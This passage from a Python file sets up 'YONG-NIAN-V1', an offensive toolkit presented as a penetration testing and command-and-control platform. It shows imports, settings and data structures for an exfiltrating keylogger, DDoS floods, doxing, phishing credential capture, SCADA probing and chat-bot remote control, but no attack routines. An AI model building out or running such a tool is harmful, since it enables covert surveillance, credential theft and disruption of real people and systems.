#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                              ║
║   ██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗       ███╗   ██╗██╗ █████╗ ███╗   ██╗                 ║
║   ╚██╗ ██╔╝██╔═══██╗████╗  ██║██╔════╝       ████╗  ██║██║██╔══██╗████╗  ██║                 ║
║    ╚████╔╝ ██║   ██║██╔██╗ ██║██║  ███╗█████╗██╔██╗ ██║██║███████║██╔██╗ ██║                 ║
║     ╚██╔╝  ██║   ██║██║╚██╗██║██║   ██║╚════╝██║╚██╗██║██║██╔══██║██║╚██╗██║                 ║
║      ██║   ╚██████╔╝██║ ╚████║╚██████╔╝      ██║ ╚████║██║██║  ██║██║ ╚████║                 ║
║      ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝       ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝                 ║
║                                                                                              ║
║   ██╗   ██╗ ██╗                                                                              ║
║   ██║   ██║███║                                                                              ║
║   ██║   ██║╚██║                                                                              ║
║   ╚██╗ ██╔╝ ██║                                                                              ║
║    ╚████╔╝  ██║                                                                              ║
║     ╚═══╝   ╚═╝                                                                              ║
║                                                                                              ║
║                    YONG-NIAN-V1 - Penetration Testing Platform                               ║
║                              Author: Ian Carter Kulani                                       ║
║                                   Version: 1.0.0                                             ║
║                                                                                              ║
║   FEATURES:                                                                                  ║
║   • Multi-Platform Command Execution (Discord, Telegram, Slack, WhatsApp, Signal,            ║
║     iMessage, Google Chat, Web Dashboard)                                                    ║
║   • All Ping Commands (30+ variants)                                                         ║
║   • All Traceroute Commands (35+ variants)                                                   ║
║   • All Nmap Commands (80+ variants)                                                         ║
║   • All Curl Commands (80+ variants)                                                         ║
║   • All Wget Commands (70+ variants)                                                         ║ 
║   • All Netcat Commands (25+ variants)                                                       ║
║   • All SSH Commands (15+ variants)                                                          ║
║   • All DOX Commands                                                                         ║
║   • All DDOS Commands                                                                        ║
║   • 100+ Social Engineering Templates                                                        ║
║   • Elite Keylogger with Screenshots & Exfiltration                                          ║
║   • Binary Analysis & Reverse Engineering                                                    ║
║   • APK Disassembly & Analysis                                                               ║
║   • Dijkstra Shortest Path Attack Mapping                                                    ║
║   • Cybersecurity LLM Model Integration                                                      ║
║   • Beautiful Web Dashboard                                                                  ║
║                                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import ctypes
import queue
import secrets
import string
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
import glob
import csv
import xml.etree.ElementTree as ET
import webbrowser
import http.server
import binascii
import marshal
import dis
import ast
import codecs
import zlib
import lzma
import bz2
import traceback
import math
import itertools
import functools
import operator
import textwrap
import warnings
import hmac
import heapq
import collections
import hashlib
import uuid
import struct
import socket
import threading
import queue
import time
import datetime
import json
import re
import subprocess
import sys
import os
import platform
import logging
import inspect
import types
import gc
import copy
import pickle
import shelve
import dbm
import sqlite3
import csv
import xml
import html
import http
import ftplib
import smtplib
import poplib
import imaplib
import json
from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable, Iterator, Generator
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from collections import Counter, defaultdict, deque, OrderedDict, namedtuple
from enum import Enum, auto, IntEnum, Flag
from functools import wraps, lru_cache, partial, reduce
from abc import ABC, abstractmethod
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from io import BytesIO, StringIO
from datetime import datetime, timedelta
from contextlib import contextmanager, suppress
from threading import Lock, RLock, Event, Semaphore, Condition
from queue import Queue, PriorityQueue, LifoQueue
from heapq import heappush, heappop, heapify
from itertools import permutations, combinations, product, chain
from functools import cached_property

# Suppress warnings
warnings.filterwarnings('ignore')

# ============================================================
# VERSION & METADATA
# ============================================================
VERSION = "1.0.0"
NAME = "YONG-NIAN-V1"
AUTHOR = "Ian Carter Kulani"
DESCRIPTION = "Ultimate Multi-Platform Penetration Testing Command & Control Platform"
BUILD_DATE = "2024"

# ============================================================
# COLOR HANDLING - YONG-NIAN THEME (Black, Cyan, White)
# ============================================================
try:
    import colorama
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

class Colors:
    """Yong-Nian themed color palette"""
    if COLORAMA_AVAILABLE:
        PRIMARY = Fore.CYAN + Style.BRIGHT
        SECONDARY = Fore.LIGHTCYAN_EX + Style.BRIGHT
        ACCENT = Fore.WHITE + Style.BRIGHT
        SUCCESS = Fore.LIGHTGREEN_EX + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        INFO = Fore.CYAN + Style.BRIGHT
        CYAN = Fore.CYAN + Style.BRIGHT
        LIGHTCYAN = Fore.LIGHTCYAN_EX + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        LIGHTWHITE = Fore.LIGHTWHITE_EX + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        YELLOW = Fore.YELLOW + Style.BRIGHT
        RED = Fore.RED + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        BLUE = Fore.BLUE + Style.BRIGHT
        RESET = Style.RESET_ALL
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        BG_CYAN = Back.CYAN + Fore.BLACK
        BG_BLACK = Back.BLACK + Fore.WHITE
        BG_BLUE = Back.BLUE + Fore.WHITE
    else:
        PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = ""
        CYAN = LIGHTCYAN = WHITE = LIGHTWHITE = ""
        GREEN = YELLOW = RED = MAGENTA = BLUE = ""
        RESET = BOLD = DIM = BG_CYAN = BG_BLACK = BG_BLUE = ""

# ============================================================
# CONFIGURATION DIRECTORIES
# ============================================================
CONFIG_DIR = ".yong_nian_v1"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "yong_nian_v1.db")
LOG_FILE = os.path.join(CONFIG_DIR, "yong_nian_v1.log")
KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
REPORT_DIR = "yong_nian_reports"
PDF_REPORTS_DIR = os.path.join(REPORT_DIR, "pdf_reports")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = os.path.join(CONFIG_DIR, "temp")
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
KEYLOG_DIR = os.path.join(CONFIG_DIR, "keylogs")
KEYLOG_SCREENSHOTS_DIR = os.path.join(CONFIG_DIR, "keylog_screenshots")
SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
AGENT_DIR = os.path.join(CONFIG_DIR, "agents")
C2_LOGS_DIR = os.path.join(CONFIG_DIR, "c2_logs")
MODULES_DIR = os.path.join(CONFIG_DIR, "modules")
NETWORK_MONITOR_DIR = os.path.join(CONFIG_DIR, "network_monitor")
KEYLOG_EXFIL_DIR = os.path.join(CONFIG_DIR, "keylog_exfil")
DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
DOMAIN_HOSTING_DIR = os.path.join(CONFIG_DIR, "domain_hosting")
CRACKING_DIR = os.path.join(CONFIG_DIR, "cracking")
DOCKER_SCANS_DIR = os.path.join(CONFIG_DIR, "docker_scans")
SAAS_DIR = os.path.join(CONFIG_DIR, "saas")
TENANTS_DIR = os.path.join(SAAS_DIR, "tenants")
BILLING_DIR = os.path.join(SAAS_DIR, "billing")
API_KEYS_DIR = os.path.join(SAAS_DIR, "api_keys")
CHARTS_DIR = os.path.join(REPORT_DIR, "charts")
MALWARE_DIR = os.path.join(CONFIG_DIR, "malware")
MALWARE_IMAGES_DIR = os.path.join(CONFIG_DIR, "malware_images")
EMAIL_COMPOSER_DIR = os.path.join(CONFIG_DIR, "email_composer")
THREAT_MONITOR_DIR = os.path.join(CONFIG_DIR, "threat_monitor")
MAC_LOGS_DIR = os.path.join(CONFIG_DIR, "mac_logs")
ARP_LOGS_DIR = os.path.join(CONFIG_DIR, "arp_logs")
NAT_LOGS_DIR = os.path.join(CONFIG_DIR, "nat_logs")
PLATFORM_LOGS_DIR = os.path.join(CONFIG_DIR, "platform_logs")
CUSTOM_PHISHING_DIR = os.path.join(CONFIG_DIR, "custom_phishing")
PHISHING_UPLOADS_DIR = os.path.join(CONFIG_DIR, "phishing_uploads")
WORDLISTS_DIR = os.path.join(CONFIG_DIR, "wordlists")
BOTS_DIR = os.path.join(CONFIG_DIR, "bots")
DISCORD_DIR = os.path.join(BOTS_DIR, "discord")
TELEGRAM_DIR = os.path.join(BOTS_DIR, "telegram")
SLACK_DIR = os.path.join(BOTS_DIR, "slack")
WHATSAPP_DIR = os.path.join(BOTS_DIR, "whatsapp")
SIGNAL_DIR = os.path.join(BOTS_DIR, "signal")
IMESSAGE_DIR = os.path.join(BOTS_DIR, "imessage")
GOOGLECHAT_DIR = os.path.join(BOTS_DIR, "googlechat")
SCADA_DIR = os.path.join(CONFIG_DIR, "scada")
STEGANOGRAPHY_DIR = os.path.join(CONFIG_DIR, "steganography")
ENCRYPTION_DIR = os.path.join(CONFIG_DIR, "encryption")
DOX_DIR = os.path.join(CONFIG_DIR, "dox")
REVERSE_ENGINEERING_DIR = os.path.join(CONFIG_DIR, "reverse_engineering")
BINARY_ANALYSIS_DIR = os.path.join(CONFIG_DIR, "binary_analysis")
APK_ANALYSIS_DIR = os.path.join(CONFIG_DIR, "apk_analysis")
LLM_DIR = os.path.join(CONFIG_DIR, "llm")
ATTACK_PATHS_DIR = os.path.join(CONFIG_DIR, "attack_paths")
GRAPH_DB_DIR = os.path.join(CONFIG_DIR, "graph_db")

# Create all directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, SCAN_RESULTS_DIR, REPORT_DIR,
    PDF_REPORTS_DIR, PHISHING_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, GRAPHICS_DIR,
    TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR, KEYLOG_DIR,
    KEYLOG_SCREENSHOTS_DIR, SPEAR_PHISHING_DIR, EMAIL_TEMPLATES_DIR,
    DOS_LOGS_DIR, AGENT_DIR, C2_LOGS_DIR, MODULES_DIR,
    NETWORK_MONITOR_DIR, KEYLOG_EXFIL_DIR, DEPLOYMENT_DIR,
    DOMAIN_HOSTING_DIR, CRACKING_DIR, DOCKER_SCANS_DIR,
    SAAS_DIR, TENANTS_DIR, BILLING_DIR, API_KEYS_DIR, CHARTS_DIR,
    MALWARE_DIR, MALWARE_IMAGES_DIR, EMAIL_COMPOSER_DIR, THREAT_MONITOR_DIR,
    MAC_LOGS_DIR, ARP_LOGS_DIR, NAT_LOGS_DIR, PLATFORM_LOGS_DIR,
    CUSTOM_PHISHING_DIR, PHISHING_UPLOADS_DIR, WORDLISTS_DIR,
    BOTS_DIR, DISCORD_DIR, TELEGRAM_DIR, SLACK_DIR, WHATSAPP_DIR,
    SIGNAL_DIR, IMESSAGE_DIR, GOOGLECHAT_DIR, SCADA_DIR,
    STEGANOGRAPHY_DIR, ENCRYPTION_DIR, DOX_DIR, REVERSE_ENGINEERING_DIR,
    BINARY_ANALYSIS_DIR, APK_ANALYSIS_DIR, LLM_DIR, ATTACK_PATHS_DIR, GRAPH_DB_DIR
]

for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - YONG-NIAN-V1 - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("YongNianV1")

# ============================================================
# DEPENDENCY IMPORTS
# ============================================================

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Google Chat
try:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.keys import Keys
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file, send_from_directory
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sendp, sniff, RandIP
    from scapy.all import conf as scapy_conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# Shodan
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors as pdf_colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.pdfgen import canvas
    from reportlab.lib.colors import HexColor
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# Keylogger
try:
    from pynput import keyboard
    from pynput.keyboard import Key, Listener
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False

# DNS Python
try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# BeautifulSoup
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# Steganography
try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# Binary Analysis
try:
    import pefile
    PEFILE_AVAILABLE = True
except ImportError:
    PEFILE_AVAILABLE = False

try:
    import capstone
    CAPSTONE_AVAILABLE = True
except ImportError:
    CAPSTONE_AVAILABLE = False

try:
    import elftools
    ELFTOOLS_AVAILABLE = True
except ImportError:
    ELFTOOLS_AVAILABLE = False

# ============================================================
# ENUMS & DATA CLASSES
# ============================================================

class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    TCP_FIN = "tcp_fin"
    TCP_RST = "tcp_rst"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    ICMP_FLOOD = "icmp_flood"
    MIXED = "mixed"
    RANDOM = "random"
    SLOWLORIS = "slowloris"

class ScanType(Enum):
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    OS = "os_detection"
    SERVICE = "service_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"
    SNMP = "snmp"
    SMB = "smb"
    SSH = "ssh"
    SCRIPT = "script"
    MASS = "mass"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"

class BotStatus(Enum):
    OFFLINE = "offline"
    ONLINE = "online"
    CONNECTING = "connecting"
    ERROR = "error"

class AttackNodeType(Enum):
    ENTRY_POINT = "entry_point"
    VULNERABILITY = "vulnerability"
    EXPLOIT = "exploit"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    LATERAL_MOVEMENT = "lateral_movement"
    DATA_EXFILTRATION = "data_exfiltration"
    TARGET = "target"

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class SSHConnection:
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0
    host_ip: Optional[str] = None
    host_port: Optional[int] = None
    short_url: Optional[str] = None

@dataclass
class CapturedCredential:
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class KeylogEntry:
    timestamp: str
    text: str
    window: str
    process: str
    screenshot: Optional[str] = None

@dataclass
class BotInfo:
    platform: str
    status: str
    connected_at: Optional[str]
    last_activity: Optional[str]
    commands_processed: int = 0
    errors: int = 0

@dataclass
class DoxEntry:
    target: str
    data: Dict
    created_at: str
    source: str

@dataclass
class AttackNode:
    id: str
    name: str
    node_type: str
    ip: str
    port: int = 0
    service: str = ""
    vulnerability: str = ""
    exploit: str = ""
    privileges: str = "none"
    risk_score: float = 0.0
    data: Dict = field(default_factory=dict)

@dataclass
class AttackEdge:
    source: str
    target: str
    weight: float
    exploit_type: str
    description: str = ""

@dataclass
class AttackPath:
    nodes: List[str]
    edges: List[AttackEdge]
    total_weight: float
    description: str

@dataclass
class BinaryInfo:
    path: str
    file_type: str
    architecture: str
    entry_point: int
    sections: List[Dict]
    imports: List[str]
    exports: List[str]
    strings: List[str]
    vulnerabilities: List[Dict]

@dataclass
class APKInfo:
    path: str
    package_name: str
    version: str
    main_activity: str
    permissions: List[str]
    activities: List[str]
    services: List[str]
    receivers: List[str]
    providers: List[str]
    libraries: List[str]
    certificate: Dict

# ============================================================
# CONFIGURATION MANAGER
# ============================================================
class ConfigManager:
    """Manages all configuration settings for YONG-NIAN-V1"""
    
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "report_format": "both",
        "generate_graphics": True,
        "log_level": "INFO",
        "max_history": 10000,
        "keylogger": {
            "enabled": False,
            "hotkey": "f10",
            "log_file": KEYLOG_FILE,
            "c2_server": "",
            "upload_interval": 30,
            "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
            "screenshot_interval": 60,
            "capture_clipboard": True,
            "capture_mic": False,
            "capture_cam": False
        },
        "web": {
            "enabled": True,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": False,
            "username": "admin",
            "password_hash": ""
        },
        "email": {
            "smtp_server": "",
            "smtp_port": 587,
            "smtp_username": "",
            "smtp_password": "",
            "from_email": "",
            "tls": True
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin",
            "guild_id": ""
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/",
            "admin_ids": []
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "space_id": "",
            "prefix": "/"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "dos": {
            "enabled": True,
            "max_threads": 100,
            "default_timeout": 60,
            "attack_types": ["syn", "udp", "http", "icmp"]
        },
        "cracking": {
            "enabled": True,
            "hashcat_path": "hashcat",
            "wordlist_path": os.path.join(WORDLISTS_DIR, "rockyou.txt"),
            "default_hash_type": 0,
            "max_threads": 4
        },
        "docker": {
            "enabled": True,
            "scan_timeout": 300,
            "benchmark_enabled": True
        },
        "shodan": {
            "api_key": "",
            "enabled": True,
            "default_query": ""
        },
        "phishing": {
            "enabled": True,
            "hosting_enabled": True,
            "default_port": 8080,
            "custom_templates_dir": CUSTOM_PHISHING_DIR,
            "shorten_links": True,
            "capture_credentials": True
        },
        "bots": {
            "auto_connect": False,
            "reconnect_interval": 30,
            "max_reconnect_attempts": 5,
            "command_timeout": 60,
            "max_output_length": 1900
        },
        "scada": {
            "enabled": True,
            "modbus_port": 502,
            "dnp3_port": 20000,
            "s7_port": 102,
            "bacnet_port": 47808
        },
        "steganography": {
            "enabled": True,
            "default_image": "",
            "encryption_key": ""
        },
        "encryption": {
            "enabled": True,
            "default_algorithm": "AES-256",
            "key_file": os.path.join(ENCRYPTION_DIR, "master.key")
        },
        "dox": {
            "enabled": True,
            "output_dir": DOX_DIR,
            "include_social_media": True,
            "include_breaches": True
        },
        "binary_analysis": {
            "enabled": True,
            "strings_min_length": 4,
            "disassemble": True,
            "detect_packing": True,
            "yara_rules": True
        },
        "apk_analysis": {
            "enabled": True,
            "decompile": True,
            "extract_manifest": True,
            "analyze_permissions": True
        },
        "llm": {
            "enabled": True,
            "model": "cybersecurity-assistant",
            "max_tokens": 4096,
            "temperature": 0.7,
            "api_key": "",
            "api_url": "",
            "local_model_path": ""
        },
        "attack_paths": {
            "enabled": True,
            "max_depth": 10,
            "algorithm": "dijkstra",
            "risk_threshold": 5.0
        },
        "mass_scanning": {
            "enabled": True,
            "max_threads": 50,
            "timeout": 5,
            "default_ports": "21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,27017"
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
        self._lock = RLock()
    
    def load(self) -> Dict:
        """Load configuration from file"""
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    merged = self._deep_merge(self.DEFAULT_CONFIG.copy(), loaded)
                    return merged
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def _deep_merge(self, base: Dict, override: Dict) -> Dict:
        """Deep merge two dictionaries"""
        result = base.copy()
        for key, value in override.items():
            if key in result and isinstance(result[key], dict) and isinstance(value, dict):
                result[key] = self._deep_merge(result[key], value)
            else:
                result[key] = value
        return result
    
    def save(self) -> bool:
        """Save configuration to file"""
        with self._lock:
            try:
                with open(self.config_file, 'w') as f:
                    json.dump(self.config, f, indent=2)
                return True
            except Exception as e:
                logger.error(f"Failed to save config: {e}")
                return False
    
    def get(self, key: str, default=None):
        """Get a configuration value"""
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k)
                if value is None:
                    return default
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        """Set a configuration value"""
        with self._lock:
            keys = key.split('.')
            target = self.config
            for k in keys[:-1]:
                if k not in target:
                    target[k] = {}
                target = target[k]
            target[keys[-1]] = value
            return self.save()

# ============================================================
# DATABASE MANAGER
# ============================================================
class DatabaseManager:
    """Manages all database operations for YONG-NIAN-V1"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self._lock = RLock()
        self.init_tables()
    
    def init_tables(self):
        """Initialize all database tables"""
        tables = [
            # Command History
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            # Threats
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            # Managed IPs
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0,
                last_scanned DATETIME,
                vulnerabilities TEXT
            )
            """,
            # SSH Connections
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            # Phishing Links
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
